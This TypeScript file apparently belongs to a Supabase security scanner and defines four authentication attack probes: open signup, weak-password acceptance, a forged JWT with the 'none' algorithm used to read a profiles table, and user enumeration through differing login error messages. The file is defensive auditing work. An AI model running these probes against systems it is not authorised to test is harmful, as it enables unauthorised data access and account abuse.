/**
 * Authentication Bypass Attacks
 * Tests for authentication and session vulnerabilities
 */

import type { AttackVector, AttackContext, AttackResult } from '$lib/types/attacks';

/**
 * Auth Attack Vectors
 */
export const authAttacks: AttackVector[] = [
	{
		id: 'auth-anon-signup-enabled',
		name: 'Anonymous Sign-up Enabled',
		description: 'Checks if anonymous users can create accounts without email verification',
		category: 'auth',
		severity: 'medium',
		tags: ['auth', 'signup', 'config'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const testEmail = `supashield.test.${Date.now()}@example.com`;
			const testPassword = 'SupaShield_Test_123!';

			try {
				const response = await fetch(`${ctx.targetUrl}/auth/v1/signup`, {
					method: 'POST',
					headers: {
						apikey: ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: testEmail,
						password: testPassword
					})
				});

				const data = await response.json();
				const canSignup = response.ok && (data.user || data.id);

				return {
					attackId: 'auth-anon-signup-enabled',
					status: canSignup ? 'breached' : 'secure',
					breached: canSignup,
					summary: canSignup
						? 'Public signup is enabled - anyone can create accounts'
						: 'Public signup is disabled or requires verification',
					details: {
						request: {
							method: 'POST',
							url: `${ctx.targetUrl}/auth/v1/signup`
						},
						response: {
							status: response.status,
							statusText: response.statusText
						}
					},
					evidence: canSignup ? { signupEnabled: true } : undefined,
					timestamp: new Date().toISOString(),
					duration: 0
				};
			} catch (err) {
				return {
					attackId: 'auth-anon-signup-enabled',
					status: 'error',
					breached: false,
					summary: `Error: ${err instanceof Error ? err.message : String(err)}`,
					details: { error: String(err) },
					timestamp: new Date().toISOString(),
					duration: 0
				};
			}
		}
	},
	{
		id: 'auth-weak-password',
		name: 'Weak Password Policy',
		description: 'Tests if weak passwords are accepted',
		category: 'auth',
		severity: 'high',
		tags: ['auth', 'password', 'policy'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const weakPasswords = ['123456', 'password', 'test123', 'abc'];
			const accepted: string[] = [];

			for (const password of weakPasswords) {
				try {
					const response = await fetch(`${ctx.targetUrl}/auth/v1/signup`, {
						method: 'POST',
						headers: {
							apikey: ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							email: `weak.test.${Date.now()}@example.com`,
							password
						})
					});

					if (response.ok) {
						accepted.push(password);
						break; // One weak password is enough to prove the point
					}
				} catch {
					// Continue
				}
			}

			const breached = accepted.length > 0;

			return {
				attackId: 'auth-weak-password',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? 'Weak passwords are accepted - password policy is too lenient'
					: 'Password policy rejects weak passwords',
				details: {},
				evidence: breached ? { acceptedWeakPasswords: accepted } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'auth-jwt-none-alg',
		name: 'JWT None Algorithm',
		description: 'Tests if the server accepts JWTs with "none" algorithm',
		category: 'auth',
		severity: 'critical',
		tags: ['auth', 'jwt', 'algorithm'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			// Create a JWT with "none" algorithm
			const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
			const payload = btoa(JSON.stringify({
				sub: '00000000-0000-0000-0000-000000000000',
				role: 'authenticated',
				exp: Math.floor(Date.now() / 1000) + 3600
			}));
			const fakeToken = `${header}.${payload}.`;

			try {
				const response = await fetch(`${ctx.targetUrl}/rest/v1/profiles?select=*&limit=1`, {
					headers: {
						apikey: ctx.anonKey,
						Authorization: `Bearer ${fakeToken}`
					}
				});

				const accepted = response.ok;

				return {
					attackId: 'auth-jwt-none-alg',
					status: accepted ? 'breached' : 'secure',
					breached: accepted,
					summary: accepted
						? 'CRITICAL: Server accepts JWTs with "none" algorithm!'
						: 'Server properly rejects JWTs with "none" algorithm',
					details: {
						request: {
							method: 'GET',
							url: `${ctx.targetUrl}/rest/v1/profiles`
						},
						response: {
							status: response.status,
							statusText: response.statusText
						}
					},
					timestamp: new Date().toISOString(),
					duration: 0
				};
			} catch (err) {
				return {
					attackId: 'auth-jwt-none-alg',
					status: 'error',
					breached: false,
					summary: `Error: ${err instanceof Error ? err.message : String(err)}`,
					details: { error: String(err) },
					timestamp: new Date().toISOString(),
					duration: 0
				};
			}
		}
	},
	{
		id: 'auth-user-enumeration',
		name: 'User Enumeration',
		description: 'Tests if the login endpoint reveals whether a user exists',
		category: 'auth',
		severity: 'medium',
		tags: ['auth', 'enumeration', 'info-disclosure'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			// Try login with known-bad email
			const fakeEmail = 'nonexistent.user.12345@example.com';
			const realishEmail = 'admin@example.com'; // Common email

			try {
				const [fakeRes, realRes] = await Promise.all([
					fetch(`${ctx.targetUrl}/auth/v1/token?grant_type=password`, {
						method: 'POST',
						headers: {
							apikey: ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							email: fakeEmail,
							password: 'wrong_password_123'
						})
					}),
					fetch(`${ctx.targetUrl}/auth/v1/token?grant_type=password`, {
						method: 'POST',
						headers: {
							apikey: ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							email: realishEmail,
							password: 'wrong_password_123'
						})
					})
				]);

				const fakeData = await fakeRes.json();
				const realData = await realRes.json();

				// If error messages are different, users can be enumerated
				const enumerable = fakeData.error_description !== realData.error_description;

				return {
					attackId: 'auth-user-enumeration',
					status: enumerable ? 'breached' : 'secure',
					breached: enumerable,
					summary: enumerable
						? 'User enumeration possible - different errors for existing vs non-existing users'
						: 'Consistent error messages prevent user enumeration',
					details: {},
					evidence: enumerable ? {
						nonExistentError: fakeData.error_description,
						existingError: realData.error_description
					} : undefined,
					timestamp: new Date().toISOString(),
					duration: 0
				};
			} catch (err) {
				return {
					attackId: 'auth-user-enumeration',
					status: 'error',
					breached: false,
					summary: `Error: ${err instanceof Error ? err.message : String(err)}`,
					details: { error: String(err) },
					timestamp: new Date().toISOString(),
					duration: 0
				};
			}
		}
	}
];
